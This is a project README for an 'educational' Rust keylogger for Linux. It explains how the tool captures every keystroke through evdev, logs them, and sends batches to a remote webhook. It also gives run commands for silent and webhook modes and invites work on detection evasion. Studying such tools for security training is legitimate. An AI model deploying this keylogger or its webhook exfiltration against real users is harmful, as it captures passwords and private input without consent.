# rust-key

An educational keylogger written in Rust for learning about input device monitoring and security awareness.

## ⚠️ Legal Disclaimer

**This tool is for educational purposes only.** Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtain proper authorization before using this tool. The authors are not responsible for misuse or damage caused by this program.

## What is This?

This project demonstrates how keyloggers work at a low level on Linux systems using the evdev interface. It's designed to help security professionals, students, and developers understand:

- How input devices are monitored at the kernel level
- How keystrokes are captured and logged
- The importance of physical security
- Why endpoint protection and monitoring are critical

## Features

- **Real-time Keystroke Logging**: Captures all keyboard input from connected devices
- **USB Keyboard Support**: Automatically detects and monitors USB keyboards
- **Multiple Keyboard Support**: Monitors all keyboards simultaneously
- **Webhook Integration**: Send keystroke data to a remote endpoint for analysis
- **Efficient Batching**: Groups keystrokes to minimize network overhead
- **Cross-Platform Ready**: Includes dependencies for Windows and macOS (Linux fully implemented)

## How It Works

The keylogger works by:
1. Scanning `/dev/input/event*` devices for keyboards
2. Using Linux's evdev interface to read raw input events
3. Mapping key codes to human-readable characters
4. Logging keystrokes to a file with timestamps
5. Optionally sending batched keystrokes to a webhook endpoint

## Building

### Requirements

- Rust (1.70 or later)
- Linux with evdev support
- Root/sudo access (required to read input devices)

### Build Instructions

```bash
# Clone the repository
git clone https://github.com/LangerSword/rust-key.git
cd rust-key

# Build the release binary
cargo build --release
```

The compiled binary will be at `target/release/rust-key`.

## Usage

### Basic Usage

```bash
# Run with local logging only
sudo ./target/release/rust-key

# Run with webhook support
sudo ./target/release/rust-key https://your-webhook-url.com/endpoint
```

Keystrokes are logged to `keylog.txt` in the current directory with this format:

```
=== Keylogger Started at 2024-01-01 12:00:00 ===
Locale: en_US.UTF-8
[2024-01-01 12:00:05.123] [USB Keyboard] Key: h
[2024-01-01 12:00:05.234] [USB Keyboard] Key: e
[2024-01-01 12:00:05.345] [USB Keyboard] Key: l
[2024-01-01 12:00:05.456] [USB Keyboard] Key: l
[2024-01-01 12:00:05.567] [USB Keyboard] Key: o
```

### Using Helper Scripts

For convenience, we provide wrapper scripts:

#### Interactive Mode (`run.sh`)
Prompts for confirmation and configuration before starting:

```bash
./run.sh
```

This will:
- Ask for confirmation
- Request webhook URL (optional)
- Start the keylogger with sudo
- Create a stop script

#### Silent Mode (`run_silent.sh`)
Runs without prompts (requires sudo upfront):

```bash
# Without webhook
sudo ./run_silent.sh

# With webhook
sudo ./run_silent.sh https://your-webhook-url.com/endpoint
```

### Testing Webhook Connectivity

Before running with webhook support, test your endpoint:

```bash
./test_webhook.sh https://your-webhook-url.com/endpoint
```

## Webhook Format

When a webhook URL is provided, keystrokes are sent in batches as JSON POST requests:

```json
{
  "keystrokes": [
    {
      "timestamp": "2024-01-01 12:00:05.123",
      "device": "USB Keyboard",
      "key": "h"
    },
    {
      "timestamp": "2024-01-01 12:00:05.234",
      "device": "USB Keyboard",
      "key": "e"
    }
  ]
}
```

Batching configuration:
- **Batch size**: 20 keystrokes per request
- **Timeout**: 2 seconds (sends partial batch if no new keys)
- **Connection timeout**: 10 seconds
- **Certificate validation**: Enabled by default (secure mode)

⚠️ **TLS Certificate Validation**: By default, the keylogger uses strict TLS certificate validation to protect against man-in-the-middle attacks. If you're using webhook testing services with self-signed certificates, you can disable validation:

```bash
export RUST_KEY_ACCEPT_INVALID_CERTS=true
sudo ./target/release/rust-key https://webhook.site/your-test-id
```

**Security Warning**: Only disable certificate validation for testing purposes. For production use with real keystroke data, always use properly signed TLS certificates and keep validation enabled (default).

### Webhook Troubleshooting

If your webhook isn't receiving data, check the `keylog.txt` file for diagnostic messages:

```bash
grep "WEBHOOK:" keylog.txt
```

Common issues and solutions:

1. **Initial connectivity test failed**
   - Check if the webhook URL is correct and accessible
   - Verify your network connection and firewall settings
   - Ensure the webhook service is running

2. **Failed to send batch to webhook**
   - DNS resolution issues: Verify the hostname resolves correctly
   - Network connectivity: Check if you can reach the endpoint with curl
   - Endpoint errors: The webhook service might be returning errors

3. **HTTP non-2xx status codes**
   - Check webhook service logs for error details
   - Verify the endpoint accepts POST requests with JSON payloads
   - Ensure Content-Type: application/json is acceptable

The keylogger will continue to log keystrokes to file even if webhook delivery fails.

## Educational Use Cases

### Security Awareness Training
Demonstrate to users why:
- Physical security matters (unattended computers are vulnerable)
- Screen locks are important
- Two-factor authentication provides additional protection
- Trusted devices and environments are critical

### Penetration Testing
Use in authorized security assessments to:
- Test endpoint detection and response (EDR) tools
- Validate monitoring and alerting systems
- Assess physical security controls
- Demonstrate attack techniques to clients

### Development and Research
Learn about:
- Linux input subsystem and evdev
- Kernel-level input device monitoring
- Network protocols and data exfiltration techniques
- Detection and prevention mechanisms

## Security Considerations

### For Users
- The keylogger captures ALL keyboard input, including passwords
- Log files contain sensitive information and should be secured
- Webhook data is transmitted over the network - use HTTPS
- Always delete or encrypt logs when no longer needed

### For Developers
- Never use this on systems you don't own or have permission to monitor
- Be aware of legal implications in your jurisdiction
- Implement proper authorization checks in production tools
- Consider privacy laws (GDPR, CCPA, etc.)

## Stopping the Keylogger

Press `Ctrl+C` if running in foreground, or use the generated stop script:

```bash
./stop_keylogger.sh
```

## Technical Details

### Linux Implementation
- Uses `evdev` crate to access input devices
- Non-blocking event loop with epoll for efficiency
- Supports multiple simultaneous keyboards
- Smart shift handling for capitalization
- UTF-8 locale support (en_US.UTF-8)

### Key Mapping
Supports:
- Letters (a-z, capitalized with Shift)
- Numbers (0-9, with shift symbols: !, @, #, etc.)
- Special keys (Enter, Tab, Space, Backspace, etc.)
- Punctuation (with shift variants)
- Arrow keys
- Function keys (F1-F12)

### Permissions

The program requires access to `/dev/input/event*` devices. You can either:

1. **Run with sudo** (simplest):
   ```bash
   sudo ./target/release/rust-key
   ```

2. **Add user to input group** (more secure):
   ```bash
   sudo usermod -a -G input $USER
   # Log out and log back in
   ./target/release/rust-key
   ```

## Platform Support

- ✅ **Linux** - Fully supported (Arch, Ubuntu, Debian, Fedora, etc.)
- 🚧 **Windows** - Dependencies included, implementation in progress
- 🚧 **macOS** - Dependencies included, implementation in progress

## Project Structure

```
rust-key/
├── src/
│   ├── main.rs         # Entry point and argument parsing
│   ├── linux.rs        # Linux/evdev implementation
│   ├── windows.rs      # Windows stub (future)
│   └── macos.rs        # macOS stub (future)
├── run.sh              # Interactive launcher script
├── run_silent.sh       # Silent launcher script
├── test_webhook.sh     # Webhook testing utility
├── Cargo.toml          # Rust dependencies
└── README.md           # This file
```

## Contributing

Contributions are welcome! Areas for contribution:
- Complete Windows implementation using winapi
- Complete macOS implementation using Core Graphics
- Add encryption for log files
- Support for additional keyboard layouts
- Configuration file support
- Detection evasion techniques (for educational purposes)

## License

MIT License - See LICENSE file for details

## Author

LangerSword

## Support

- GitHub: https://github.com/LangerSword/rust-key
- Issues: https://github.com/LangerSword/rust-key/issues

---

**Remember**: This tool is powerful. Use it responsibly and ethically. Always obtain proper authorization before monitoring any system.
